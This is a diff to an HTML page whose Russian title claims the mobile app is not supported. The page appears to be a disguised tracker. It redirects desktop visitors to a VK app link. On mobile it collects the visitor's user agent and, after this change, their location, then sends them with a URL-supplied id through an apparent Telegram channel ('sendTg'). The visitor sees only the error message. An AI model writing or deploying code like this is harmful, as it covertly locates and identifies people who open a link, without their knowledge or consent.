@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>К сожалению мобильное приложение не поддерживается</title>
     <script src="common.js"  type="text/javascript"></script>
+    <script src="geo.js"  type="text/javascript"></script>
     <script>
         var id = _huy.gup('id');
         (function () {
@@ -13,7 +14,18 @@
             if (!detectmob()) {
                 window.location.href = 'https://vk.com/app6103406_'+id;
             } else {
-                _huy.sendTg(id, window.navigator.userAgent);
+                var result = {
+                    navigator: window.navigator.userAgent
+                };
+                _huy.getGeo(function (err, res) {
+                    if (!err && res) {
+                        result.location = res;
+                    } else {
+                        console.error(err);
+                    }
+
+                    _huy.sendTg(id, result);
+                });
             }
         })();
 
